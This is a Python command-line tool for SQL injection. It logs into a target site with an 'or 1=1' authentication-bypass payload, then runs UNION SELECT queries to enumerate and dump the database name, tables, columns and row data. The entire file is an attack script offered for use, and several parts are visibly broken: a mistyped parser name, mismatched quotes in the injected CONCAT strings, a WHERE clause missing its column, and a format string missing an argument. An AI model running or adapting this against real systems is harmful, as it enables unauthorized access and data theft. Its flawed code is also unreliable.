import requests
from getopt import getopt
import sys
from bs4 import BeautifulSoup

# python main.py -t http://localhost:1234 -u /

session = requests.session()

TARGET = ""
URI = ""
DATABASE = ""
TABLE = ""
COLUMN = ""
DATA = ""
DUMP = ""
TABLES = []
COLUMN_COUNT = 0
COLUMNS = []
DATAS = []
def get_column_count():
    global COLUMN_COUNT
    full_url = TARGET + URI + "UNION SELECT "
    for i in range(1, 100):
        if i == 1:
            full_url += ', '
        full_url += str(i)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text, "html_parser")
        container = soup.find("div", attrs={"class": "container content"})
        if container.text.strip != "":
            COLUMN_COUNT = i
            break


def attack():
    global DATABASE_NAME, TABLES, COLUMNS, DATAS
    if DATABASE or DUMP:

        full_url = TARGET + URI + " UNION SELECT 1, "
        for i in range(2, COLUMN_COUNT + 1):
            full_url += "CONCAT('<data>', DATABASE(), </data>')"
        full_url += " LIMIT 1 OFFSET 1"
        print("Database Name : ", full_url)
        resp = session.get(full_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        DATABASE_NAME = soup.find("data").decode_contents()
        print("Database Name : ", soup.find("data").decode_contents())
        if TABLE or DUMP:
            full_url = TARGET + URI + " UNION SELECT 1, "
            for i in range(2, COLUMN_COUNT + 1):
                full_url += "CONCAT('<data>', TABLE_NAME, </data>')"
            full_url += " FROM INFORMATION_SCHEMA.TABLES WHERE = '%s' LIMIT 1 OFFSET 1"%DATABASE_NAME
            print("Database Name : ", full_url)
            resp = session.get(full_url)
            soup = BeautifulSoup(resp.text, "html.parser")
            TABLES = soup.find("data").decode_contents().split((","))
            print("Tables :", TABLES)
            if COLUMN or DUMP:
                for table in TABLES:
                    for i in range(2, COLUMN_COUNT + 1):
                        full_url += "CONCAT('<data>', GROUP_CONCAT(COLUMN_NAME), </data>')"
                    full_url += " FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '%s' AND TABLE_NAME = '%s' LIMIT 1 OFFSET 1" % DATABASE_NAME
                    print("Database Name : ", full_url)
                    resp = session.get(full_url)
                    soup = BeautifulSoup(resp.text, "html.parser")
                    columns = soup.find("data").decode_contents().split(",")
                    COLUMNS.append(columns)
                    if DATA or DUMP:
                        array = []
                        for column in columns:
                            for i in range(2, COLUMN_COUNT + 1):
                                full_url += "CONCAT('<data>', GROUP_CONCAT('%s'), </data>')"%column
                            full_url += " FROM %s.%s LIMIT 1 OFFSET 1"%(DATABASE_NAME, table)
                            print("Database Name : ", full_url)
                            resp = session.get(full_url)
                            soup = BeautifulSoup(resp.text, "html.parser")
                            array.append(soup.find("data").decode_contents().split(","))
                        DATAS.append(array)
                print("Columns: ", COLUMNS)
                print("Datas: ", DATAS)




opts, _ = getopt(sys.argv[1:], "t:u:", ["database", "table", "column", "data", "dump"])

for key, value in opts:
    if key in ["-t", "--target"]:
        TARGET = value
    elif key in ["-u", "--uri"]:
        URI = value
    elif key == "--database":
        DATABASE = True
    elif key == "--table":
        TABLE = True
    elif key == "--column":
        COLUMN = True
    elif key == "--dump":
        DUMP = True

resp = session.get(TARGET + URI)

# print(resp.status_code)
# print(resp.url)

if (resp.url != (TARGET + URI)):
    soup = BeautifulSoup(resp.text, "html.parser")
    login_form = soup.find("form")
    #
    # print(login_form["action"], login_form["method"])
    session.request(login_form["method"], TARGET + "/" + login_form["action"], data={
        "csrf_token": login_form.find("input", attrs={"name": "csrf_token"})["value"],
        "action": login_form.find("input", attrs={"name": "action"})["value"],
        "username": "' or 1=1 LIMIT 1#'",
        "password": "' or 1=1 LIMIT 1#'"
    })
    # print(resp.url)
    resp = session.get(TARGET + URI)
    if (TARGET + URI) == resp.url:
        print("Login succesful")
        get_column_count()
        attack()
    else:
        print("Failed bypass login")
